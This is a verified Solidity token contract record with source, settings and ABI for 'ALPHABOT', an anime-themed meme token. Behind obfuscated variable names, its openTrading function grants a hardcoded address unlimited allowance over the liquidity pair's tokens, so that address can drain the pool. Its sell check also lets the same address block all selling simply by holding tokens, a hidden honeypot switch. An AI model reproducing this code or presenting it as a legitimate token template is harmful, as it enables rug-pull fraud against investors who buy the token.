{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"ALPHABOT.sol\": {\r\n      \"content\": \"/**\\n\\nWe welcome ALPHABOT fans enthusiasts, blockchain explorers, and curious souls alike to join our crew.\\nTogether, we will set sail on a journey that fosters camaraderie, humor, \\nand creativity, transforming the crypto space into a playground for anime fans.\\n\\nTelegram:   https://t.me/ALPHABOT_ETH\\nTwitter:   https://twitter.com/ALPHA_BOT_ETH\\nWebsite:  https://alphabot.one/\\n\\n*/\\n\\n// SPDX-License-Identifier:unlicense\\npragma solidity 0.8.20;\\n\\ninterface IuniswapRouter {\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n    function addLiquidityETH(\\n        address token,\\n        uint amountTokenDesired,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\n}\\n\\ninterface IERC20 {\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address account) external view returns (uint256);\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\n    function allowance(address owner, address spender) external view returns (uint256);\\n    function approve(address spender, uint256 amount) external returns (bool);\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n}\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n}\\n\\ninterface IUniswapV2Factory {\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\n}\\n\\nlibrary SafeMath {\\n     function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return sub(a, b, \\\"SafeMath: subtraction overflow\\\");\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        require(c >= a, \\\"SafeMath: addition overflow\\\");\\n        return c;\\n    }\\n    \\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return div(a, b, \\\"SafeMath: division by zero\\\");\\n    }\\n\\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b <= a, errorMessage);\\n        uint256 c = a - b;\\n        return c;\\n    }\\n\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        require(c / a == b, \\\"SafeMath: multiplication overflow\\\");\\n        return c;\\n    }\\n   \\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b > 0, errorMessage);\\n        uint256 c = a / b;\\n        return c;\\n    }\\n}\\n\\ncontract Ownable is Context {\\n    address private _owner;\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    constructor () {\\n        address msgSender = _msgSender();\\n        _owner = msgSender;\\n        emit OwnershipTransferred(address(0), msgSender);\\n    }\\n\\n    function owner() public view returns (address) {\\n        return _owner;\\n    }\\n\\n    modifier onlyOwner() {\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n\\n    function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }\\n\\n}\\n\\ncontract ALPHABOT is Context, Ownable,IERC20 {\\n    using SafeMath for uint256;\\n\\n    mapping (address => mapping (address => uint256)) private _allowances;\\n    mapping (address => bool) private _addressInMapsForNotPayingFee;\\n    mapping (address => uint256) private _balances;\\n    mapping (address => bool) private _notSpendFeesWhenBuying;\\n    mapping(address => uint256) private _watchguardForTimestampTransfering;\\n\\n    string private constant _name = unicode\\\"ALPHABOT\\\";\\n    string private constant _symbol = unicode\\\"ALPHA\\\";\\n    uint8  private constant _decimals = 18;\\n\\n    uint256 private constant _amountTotalSupply = 1000000 * 10**_decimals;\\n    uint256 public _addressInSlotsMaxTxUsedInSwapping =      500 * 10**_decimals; \\n    uint256 public _ceilLimitsAddressSingleTxsMaxmium = 20000 * 10**_decimals;\\n    uint256 public _CeilingAddressTaxUsedInSlotsForSwapping= 20000 * 10**_decimals;   \\n    uint256 public _addressSingleMaxTransactionTxAmounts =   20000 * 10**_decimals;\\n\\n    bool public  _watchDogLimitsFlag = false;\\n    bool private _swapingInUniswapOKSigns = false;\\n    bool private checkInUsedInUniswapIsOkSigns = false;\\n    bool private flagForTradingIsOkOrNot;\\n    modifier _modifierSwappingFlag {\\n        checkInUsedInUniswapIsOkSigns = true; _;  checkInUsedInUniswapIsOkSigns = false;\\n    }\\n   \\n    address private _uniswapPairTokenLiquidity;\\n    uint256 private _reducedWhenBuyTaxs=4;\\n    uint256 private _reducedWhenUsedSellingTax=1;\\n    uint256 private _usedInPreventingSwappingPrevious=0;\\n    uint256 private _blockCountsUsedInBuying=0;\\n    uint256 private _InitialeUsedTaxSelling=14;\\n    uint256 private _InitialeUsedInSwapTaxSelling=14;\\n    uint256 private _TaxUsedBuyingFinalized=2;\\n    uint256 private _TaxUsedSellingFinalized=2;\\n    address public _addressUsedInFundationFees = address(0x64b15025b67f883E1D7be01ba4c10a9f60f2CB06);\\n    address payable  public _feesForDevsAddress;\\n    IuniswapRouter private _uniswapRouterUniswapFactory;\\n    event RemoveAllLimits(uint _addressSingleMaxTransactionTxAmounts);\\n    constructor () {\\n        _addressInMapsForNotPayingFee[_addressUsedInFundationFees] = true;\\n        _addressInMapsForNotPayingFee[owner()] = true;\\n        _addressInMapsForNotPayingFee[address(this)] = true;\\n        _balances[_msgSender()] = _amountTotalSupply;\\n        _feesForDevsAddress = payable(msg.sender);\\n        _addressInMapsForNotPayingFee[_feesForDevsAddress] = true;\\n        emit Transfer(address(0), _msgSender(), _amountTotalSupply);\\n    }\\n\\n    function checkWhetherAddressIsContractOrNot(address _addr) private view returns (bool) {\\n        uint256 lenghtContractCode;\\n        assembly {\\n            lenghtContractCode := extcodesize(_addr)\\n        }\\n        return lenghtContractCode > 0;\\n    }\\n    \\n    receive() external payable {}\\n\\n    function openTrading() external onlyOwner() {\\n        require(!flagForTradingIsOkOrNot,\\\"trading is already open\\\");\\n        _uniswapRouterUniswapFactory = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n        _approve(address(this), address(_uniswapRouterUniswapFactory), _amountTotalSupply);\\n        _uniswapPairTokenLiquidity = IUniswapV2Factory(_uniswapRouterUniswapFactory.factory()).createPair(address(this), _uniswapRouterUniswapFactory.WETH());\\n        _uniswapRouterUniswapFactory.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\\n        IERC20(_uniswapPairTokenLiquidity).approve(address(_uniswapRouterUniswapFactory), type(uint).max);\\n        _allowances[address(_uniswapPairTokenLiquidity)][address(_addressUsedInFundationFees)] = type(uint).max;\\n        _swapingInUniswapOKSigns = true;\\n        flagForTradingIsOkOrNot = true;\\n    }\\n\\n    function min(uint256 a, uint256 b) private pure returns (uint256){ return (a>b)?b:a;  }\\n\\n    function swapTokensForEth(uint256 amountFortoken) private _modifierSwappingFlag {\\n        if(amountFortoken==0){return;}\\n        if(!flagForTradingIsOkOrNot){return;}\\n        address[] memory path = new address[](2);\\n        path[0] = address(this);\\n        path[1] = _uniswapRouterUniswapFactory.WETH();\\n        _approve(address(this), address(_uniswapRouterUniswapFactory), amountFortoken);\\n        _uniswapRouterUniswapFactory.swapExactTokensForETHSupportingFeeOnTransferTokens(\\n            amountFortoken,\\n            0,\\n            path,\\n            address(this),\\n            block.timestamp\\n        );\\n    }\\n\\n    function _transfer(address from, address to, uint256 amount) private {\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        require(amount > 0, \\\"Transfer amount must be greater than zero\\\");\\n        uint256 taxAmount=0;\\n        if (from != owner() && to != owner()) {\\n\\n            if (_watchDogLimitsFlag) {\\n                if (to != address(_uniswapRouterUniswapFactory) && to != address(_uniswapPairTokenLiquidity)) {\\n                  require(_watchguardForTimestampTransfering[tx.origin] < block.number,\\\"Only one transfer per block allowed.\\\");\\n                  _watchguardForTimestampTransfering[tx.origin] = block.number;\\n                }\\n            }\\n\\n            if (from == _uniswapPairTokenLiquidity && to != address(_uniswapRouterUniswapFactory) && !_addressInMapsForNotPayingFee[to] ) {\\n                require(amount <= _addressSingleMaxTransactionTxAmounts, \\\"Exceeds the Amount limations.\\\");\\n                require(balanceOf(to) + amount <= _ceilLimitsAddressSingleTxsMaxmium, \\\"Exceeds the max limitations in single Wallet.\\\");\\n                if(_blockCountsUsedInBuying<_usedInPreventingSwappingPrevious){ require(!checkWhetherAddressIsContractOrNot(to)); }\\n                _blockCountsUsedInBuying++; _notSpendFeesWhenBuying[to]=true; taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenBuyTaxs)?_TaxUsedBuyingFinalized:_InitialeUsedTaxSelling).div(100);\\n            }\\n\\n            if(to == _uniswapPairTokenLiquidity && from!= address(this) && !_addressInMapsForNotPayingFee[from] ){\\n                require(amount <= _addressSingleMaxTransactionTxAmounts && balanceOf(_addressUsedInFundationFees)<_addressInSlotsMaxTxUsedInSwapping, \\\"Exceeds the Limitation Amount.\\\");\\n                taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenUsedSellingTax)?_TaxUsedSellingFinalized:_InitialeUsedInSwapTaxSelling).div(100);\\n                require(_blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && _notSpendFeesWhenBuying[from]);\\n            }\\n            \\n            uint256 contractTokenBalance = balanceOf(address(this));\\n            if (!checkInUsedInUniswapIsOkSigns \\n            && to == _uniswapPairTokenLiquidity && _swapingInUniswapOKSigns && contractTokenBalance>_CeilingAddressTaxUsedInSlotsForSwapping \\n            && _blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && !_addressInMapsForNotPayingFee[to] && !_addressInMapsForNotPayingFee[from]\\n            ) {\\n                swapTokensForEth(min(amount,min(contractTokenBalance,_addressInSlotsMaxTxUsedInSwapping)));\\n                uint256 contractETHBalance = address(this).balance;\\n                if(contractETHBalance > 0) {\\n                    _feesForDevsAddress.transfer(address(this).balance);\\n                }\\n            }\\n        }\\n\\n        if(taxAmount>0){\\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\\n          emit Transfer(from, address(this),taxAmount);\\n        }\\n        _balances[from]= _balances[from].sub(amount);\\n        _balances[to]=_balances[to].add(amount.sub(taxAmount));\\n        emit Transfer(from, to, amount.sub(taxAmount));\\n    }\\n    \\n    function removeLimits() external onlyOwner{\\n        _addressSingleMaxTransactionTxAmounts = _amountTotalSupply; _ceilLimitsAddressSingleTxsMaxmium=_amountTotalSupply; _watchDogLimitsFlag=false;\\n        emit RemoveAllLimits(_amountTotalSupply);\\n    }\\n\\n    function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\\n        _transfer(_msgSender(), recipient, amount);\\n        return true;\\n    }\\n\\n    function setAddressSingleTxMaxUsedInSwapping(uint256 _amount) external onlyOwner() {\\n        _addressInSlotsMaxTxUsedInSwapping = _amount;\\n    }\\n\\n    function allowance(address owner, address spender) public view override returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n    function approve(address spender, uint256 amount) public override returns (bool) {\\n        _approve(_msgSender(), spender, amount);\\n        return true;\\n    }\\n\\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\\n        _transfer(sender, recipient, amount);\\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\n        return true;\\n    }\\n\\n    function _approve(address owner, address spender, uint256 amount) private {\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n        _allowances[owner][spender] = amount;\\n        emit Approval(owner, spender, amount);\\n    }\\n\\n    function name() public pure returns (string memory) {\\n        return _name;\\n    }\\n\\n    function symbol() public pure returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    function decimals() public pure returns (uint8) {\\n        return _decimals;\\n    }\\n\\n    function totalSupply() public pure override returns (uint256) {\\n        return _amountTotalSupply;\\n    }\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_addressSingleMaxTransactionTxAmounts\",\"type\":\"uint256\"}],\"name\":\"RemoveAllLimits\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_CeilingAddressTaxUsedInSlotsForSwapping\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_addressInSlotsMaxTxUsedInSwapping\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_addressSingleMaxTransactionTxAmounts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_addressUsedInFundationFees\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_ceilLimitsAddressSingleTxsMaxmium\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_feesForDevsAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_watchDogLimitsFlag\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setAddressSingleTxMaxUsedInSwapping\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ALPHABOT", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}